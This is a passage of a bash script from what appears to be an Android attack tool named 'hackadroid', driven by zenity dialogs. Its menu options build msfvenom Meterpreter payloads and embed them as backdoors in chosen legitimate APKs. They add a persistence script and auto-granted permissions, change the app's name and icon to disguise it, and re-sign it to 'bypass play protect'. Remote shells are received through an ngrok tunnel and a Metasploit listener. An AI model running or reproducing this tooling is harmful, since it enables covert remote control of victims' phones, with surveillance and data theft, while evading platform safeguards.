		fi
		auto_listner=$(zenity --question --title "AUTO LISTNER" --text "you want me to run auto listner and make payload auto persistent now ? " --width 300 --height 100 2> /dev/null)
		if [ $? -eq 0 ];then			
		        user_ip
		        user_lhost
		        user_lport
		        user_payload
		        zen_notify=$(zenity --info --title "Notification" --width=300 --height=100 --text "type 'shell' when connected to device and copy ( sh persistent.sh ) this and paste to terminal after it ") 2> /dev/null
		        ## meterpreter raw
		        auto_meterpreter
		        ## multi handler_raw
		        start_listner
                        sed -i '/set LPORT.*/ a set AutoRunScript meterpreter.rc' auto_handler.rc
		        run_exploit_pers
		else
		        thankyou
		        exit 1
		fi		  
		thankyou
		clean
		break;

	elif [ $option = 08 ] || [ $option = 8 ]
	then
		
		persistent_apk=$(zenity --title "select original apk for which you wish to generate persistent script" --file-selection --file-filter "*.apk" --multiple --filename="$HOME/Desktop"  2> /dev/null)
		warn=$(zenity --warning --width=350 --height=140 --text "For embeded payload enter time interval more than 1800  i.e.  30 min which mean apk will start its activity again in 30 min, else apk will start crashing"  2> /dev/null )
		time=$(zenity --title="PERSISTENT PAYLOAD USER DEFINE" --text "enter time interval : for 1800 sec just enter 1800" --entry-text "1800" --entry --width 300 --height 150 2> /dev/null)
	      	package=$(aapt dump badging ${persistent_apk} | awk '/package/{gsub("name=|'"'"'","");  print $2}')
	        activity=$(aapt dump badging ${persistent_apk} | awk '/activity/{gsub("name=|'"'"'","");  print $2}')
	        sleep 2;
		persistent_script
		sed -i "s%do am.*%do am start --user 0 -a android.intent.action.MAIN -n ${package}/${activity}%g; s%sleep.*%sleep $time%g" persistent.sh
		success=$(realpath persistent.sh)
		if [ -f persistent.sh ];then			
		        notify-send -t 120000 'hackadroid' "embeded persistent script sucessfully generated" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "embeded persistent script has been generated successfully and saved as ${success} "
		else	          
		        zenity --error  --width=300 --height=100 --text "unable to inject persistent script in apk !! or open issue on github"
		        github_issue		
		        exit 1
		fi		
		sleep 1
                auto_listner=$(zenity --question --title "AUTO LISTNER" --text "you want me to run auto listner for you and make payload auto persistent now ? " --width 300 --height 100 2> /dev/null) 
		if [ $? -eq 0 ];then			
		        user_ip
		        user_lhost
		        user_lport
		        user_payload
		        zen1=$(zenity --info --title "Notification" --width=300 --height=100 --text "type 'shell' when connected to device and copy ( sh persistent.sh ) this and paste to the terminal after it") 2> /dev/null
		        ##auto meterpreter
		        auto_meterpreter
		        ##multi handler
		        start_listner
                        sed -i '/set LPORT.*/ a set AutoRunScript meterpreter.rc' auto_handler.rc
		        run_exploit_pers
		else	          
		        thankyou
	                exit 1
		fi		 
		thankyou
		clean
	        break;

        elif [ $option = 09 ] || [ $option = 9 ]
        then
			         
	        perm_dir=$(mktemp -d)
		rm -rf ${perm_dir}
		apk=$(zenity --title "select payload in which you wish to embed auto allow permissions" --file-selection --file-filter "*.apk" --multiple --filename "${HOME}/Desktop"  2> /dev/null) 
		perm_added=$(zenity --title "PAYLOAD NAME" --text "enter payload output name" --entry --entry-text "hackadroid.apk" --width 270)
		launch="Injecting auto allow script in ${apk}"
		splashdown="Injected auto allow script in ${apk}"
		(xterm -T "DECOMPILING PAYLOAD" -e apktool d -r -s ${apk} -o ${perm_dir}) & spinner;echo
		launch="Rebuilding apk with auto allow permissions"
		splashdown="Rebuilded apk with auto allow permissions"
	        for i in minSdkVersion targetSdkVersion; do			
		        sed -i "s/$i.*/$i: '22'/" ${perm_dir}/apktool.yml
		done
		(xterm -T "RECOMPILING PAYLOAD" -e apktool b -f -d ${perm_dir} -o ash.apk) & spinner;echo
          	rm -rf ${perm_dir}
		launch="Signing an ${apk} with pk8 test key"
	        splashdown="Signed an ${apk} with pk8 test key"
	        sleep 5 & spinner;echo -e "\e[0m"
		java -jar signapk/signapk.jar signapk/testkey.x509.pem signapk/testkey.pk8 ash.apk ${perm_added}
		rm -rf ash.apk
		success=$(realpath ${perm_added})
		if [ -f "${perm_added}" ];then			
		        notify-send -t 120000 'hackadroid' "Auto permission successfully injected" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Auto permission as been successfully embed in payload and saved as ${success}"
		else			
		        zenity --error  --width=300 --height=100 --text "unable to embed auto permission in payload try again !! or open issue on github"
		        github_issue
		fi		  
		thankyou
		break;

        elif [ $option = 10 ]
        then
	       	
	       #change application name and icon
	       original_apk=$(zenity --title "select payload to change apk name & icon" --file-selection --file-filter "*.apk" --multiple --filename="$HOME/Desktop"  2> /dev/null)
               user_output_payload_name
     	       change_name_icon_dir=$(mktemp -d)
	       rm -rf ${change_name_icon_dir}
	       xterm -T "CHANGE APP NAME & ICON" -e apktool d -f ${original_apk} -o ${change_name_icon_dir}
	       select_icon=$(zenity --title "CHOOSE YOUR APP ICON " --filename=${dir} --file-selection --file-filter "*.png" --text "select your image" 2> /dev/null)
	       app_name=$(zenity --title "APPLICATION NAME" --text "enter name you wish to give to your app" --entry --entry-text "anyname" --width 270 --height 120 2> /dev/null)
	       change_name='    <application android:label="@string/app_name">'
	       change_icon='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
	       sed -i "s|${change_name}|${change_icon}|g" ${change_name_icon_dir}/AndroidManifest.xml 2>&1
	       sed -i "s|MainActivity|${app_name}|g" ${change_name_icon_dir}/res/values/strings.xml 2>&1
	       if [ ! -d "${change_name_icon_dir}/res/drawable" ];then		       
	               mkdir ${change_name_icon_dir}/res/drawable
	       fi	       
	       cp -R ${select_icon} ${change_name_icon_dir}/res/drawable/main_icon.png
	       xterm -T "REBUILD APK" -e apktool b -f -d ${change_name_icon_dir} -o ash.apk
	       rm -rf ${change_name_icon_dir}
	       echo
	       java -jar signapk/signapk.jar signapk/testkey.x509.pem signapk/testkey.pk8 ash.apk ${payload_name}
	       rm -rf ash.apk
	       success=$(realpath ${payload_name})	     
	       if [ -f "${payload_name}" ];then		       
	               notify-send -t 120000 'hackadroid' "apk name & icon successfully changed" --icon=/root/Desktop/hackadroid/icon/download.png
		       sleep 1
		       zenity --info --title "Notification" --width=300 --height=100 --text "Name and icon of apk has been successfully changed and save as ${success}"
	       else
		       zenity --error  --width=300 --height=100 --text "unable to change apk name and icon !! or open issue on github"
		       github_issue
	       fi
	       thankyou
	       break;

        elif [ $option = 11 ]
        then
			      
	        user_ip
		user_lhost
		user_lport
		user_payload
		start_listner
		run_exploit
		thankyou
		clean
		break;

        elif [ $option = 12 ]
        then
		
	        ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
                kill -9 $ngrok > /dev/null 2>&1
		kill_msf="$(lsof -i :4567 | awk '{print $2}' | grep -v "PID")"
		kill -9 $kill_msf > /dev/null 2>&1
                gnome-terminal --quiet --geometry '-3+3' -e 'sh -c "resize -s 15 75; ngrok start --all; exec bash"'	       
                launch="Starting Hackadroid over wan"
		splashdown="Started hackadroid over wan"
		sleep 15 & spinner;echo
		rport="$(curl --silent --max-time 10 --connect-timeout 5 --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'| sed 's/^.\{15\}//g')";			
		ask=$(zenity  --title "PAYLOAD OVER WAN" --list  --text "select option for payload" --radiolist  --column "select" --column "option" TRUE 'raw' FALSE 'embeded') 2> /dev/null
		case $ask in
			raw)				
		                user_payload
		                user_output_payload_name
		                launch="Injecting permission in apk"
		                splashdown="Injected permission in apk"
	                        sleep 5 & spinner;echo		        
                                launch="Generating a raw paylaod"
		                splashdown="Generated a raw payload"
		                (msfvenom -p ${android_payload} LHOST=0.tcp.ngrok.io LPORT=${rport} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o hack.apk 2> /dev/null) & spinner;echo -e "\e[0m"
				;;
			embeded)				
	                        user_payload
		                embed_payload
		                user_output_payload_name
		                launch="Injecting permission in apk"
		                splashdown="Injected permission in apk"	               
	                        sleep 5 & spinner;echo
                                launch="Generating embed backdoor paylaod"
		                splashdown="Generated embeded backdoor payload"		                
		                (xterm -T "EMBED PAYLOAD" -e sudo msfvenom -x ${bind_apk} -p ${android_payload} LHOST=0.tcp.ngrok.io LPORT=${rport} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o hack.apk) & spinner;echo -e "\e[0m"
				;;
		esac		
		# bypass play-protect automatically
		ask_sign=$(zenity --question --title "SIGN AN APK" --text "Bypass playprotect for you ??" --width 300 --height 100 2> /dev/null)
		if [ $? -eq 0 ];then
                        launch="Bypassing play protect in apk"
		        splashdown="Bypassed play protect in apk"
	                sleep 5 & spinner;echo -e "\e[0m"		                               			
                        java -jar signapk/signapk.jar signapk/testkey.x509.pem signapk/testkey.pk8 hack.apk ${payload_name}
			rm -rf hack.apk
		else
			mv hack.apk ${payload_name}
			rm -f hack.apk
		fi
                success=$(realpath ${payload_name})
		if [ -f "${payload_name}" ];then			
	                notify-send -t 120000 'hackadroid' "apk sucessfully build" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfilly build and save as ${success}"
		else
		        zenity --error  --width=300 --height=100 --text "unable to build apk try again !! or open issue on github"
	                github_issue
		fi
		arch
		start_listner
		sed -i "s/set LHOST.*/set LHOST 0.0.0.0/g" auto_handler.rc
		sed -i "s/set LPORT.*/set LPORT 4567/g" auto_handler.rc
		run_exploit		                								 
		thankyou
		clean
		break;

        elif [ $option = 13 ]
        then
		
                zenity --warning --width=400 --height=200 --text "If you use apksigner, zipalign must only be performed before the APK file has been signed. If you sign your APK using apksigner and make further changes to the APK, its signature is invalidated. If you use jarsigner, zipalign must only be performed after the APK file has been signed."     
	        zipalign_apk=$(zenity --title "select apk to be zipalign" --file-selection --file-filter "*.apk" --multiple --filename="$HOME/Desktop"  2> /dev/null)
                payload_name=$(zenity --title "APK NAME" --text "set output apk name" --entry --entry-text "zipalign.apk" --width 270 --height 120 2> /dev/null);
		xterm -T "ZIPALIGN APK" -e zipalign -v 4 $zipalign_apk $payload_name
		sleep 3
		success=$(realpath ${payload_name})
		if [ -f "${payload_name}" ];then			
	                notify-send -t 120000 'hackadroid' "apk sucessfully zipalign" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfilly zipalign and save as ${success}"
		else			
		        zenity --error  --width=300 --height=100 --text "unable to zipalign apk try again !! or open issue on github"
		        github_issue
		fi		 
		thankyou
		break;

        elif [ $option = 14 ]
        then
		
                check_jdx
	        jadx-gui > /dev/null 2>&1
		sleep 0.4
		thankyou
	        break;

        elif [ $option = quit ] || [ $option = exit ]
        then 
		
		hackadroid_disconnect
                stop_hackadroid
		sleep 0.4
		thankyou
	        break;

	else

		error_msg "error option try again"
		sleep 2
	fi
done


